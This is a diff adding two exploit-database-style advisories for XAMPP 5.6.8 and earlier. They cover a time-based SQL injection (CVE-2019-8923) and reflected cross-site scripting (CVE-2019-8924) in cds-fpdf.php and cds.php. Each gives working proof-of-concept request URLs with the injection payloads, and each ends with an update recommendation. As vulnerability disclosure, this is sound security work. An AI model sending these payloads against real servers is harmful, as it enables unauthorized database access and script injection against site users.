@@ -1,0 +1,76 @@
+<!--
+# Exploit Title: SQL injection in XAMPP 5.6.8 (and previous)
+# Date: 17-02-2019
+# Exploit Author: Rafael Pedrero
+# Vendor Homepage: https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/5.6.8/
+# Software Link: https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/5.6.8/
+# Version: XAMPP 5.6.8
+# Tested on: All
+# CVE : CVE-2019-8923
+# Category: webapps
+
+ 
+1. Description
+   
+XAMPP through 5.6.8 allows SQL injection via the cds-fpdf.php jahr parameter. NOTE: This product is discontinued. Affected Product Code Base XAMPP 1.8.2 (and previous).
+ 
+   
+2. Proof of Concept
+ 
+http://localhost/xampp/cds-fpdf.php?interpret=SQLi&titel=SQLi&jahr=1984%20%20AND%20sleep%285%29
+
+   
+3. Solution:
+   
+The product is discontinued. Update to last version.
+
+Reference:
+https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/1.8.2/
+https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/5.5.19/
+https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/5.6.8/
+
+-->
+
+
+<!--
+# Exploit Title: Cross Site Scripting in XAMPP 5.6.8 (and previous)
+# Date: 17-02-2019
+# Exploit Author: Rafael Pedrero
+# Vendor Homepage: https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/5.6.8/
+# Software Link: https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/5.6.8/
+# Version: XAMPP 5.6.8
+# Tested on: All
+# CVE : CVE-2019-8924
+# Category: webapps
+ 
+1. Description
+   
+XAMPP through 5.6.8 allows XSS via the cds-fpdf.php interpret or titel parameter. NOTE: This product is discontinued. Affected Product Code Base XAMPP 1.8.2 (and previous).
+ 
+   
+2. Proof of Concept
+
+First Request (not filter the characters's content): http://X.X.X.X/xampp/cds.php?interpret=<script>alert("XSS")</script>&titel=XSS&jahr=1984
+
+or Request: http://localhost/xampp/cds.php?interpret=XSS&titel=<script>alert("XSS")</script>&jahr=1984
+
+Second Request (to xss attack): http://X.X.X.X/xampp/cds-fpdf.php 
+
+http://localhost/xampp/cds-fpdf.php?interpret=XSS&titel=<script>alert("XSS")</script>&jahr=1984
+
+http://localhost/xampp/cds-fpdf.php?interpret=<script>alert("XSS")</script>&titel=XSS&jahr=1984
+
+When cds-fpdf.php is loaded not filter the characters: <b><script>alert("XSS")</script></b></td><td class=tabval>
+
+cds.php filter it: <td class=tabval><b><script>alert("XSS&quot</script></b></td><td class=tabval>
+   
+3. Solution:
+   
+The product is discontinued. Update to last version.
+
+Reference:
+https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/1.8.2/
+https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/5.5.19/
+https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/5.6.8/
+
+-->
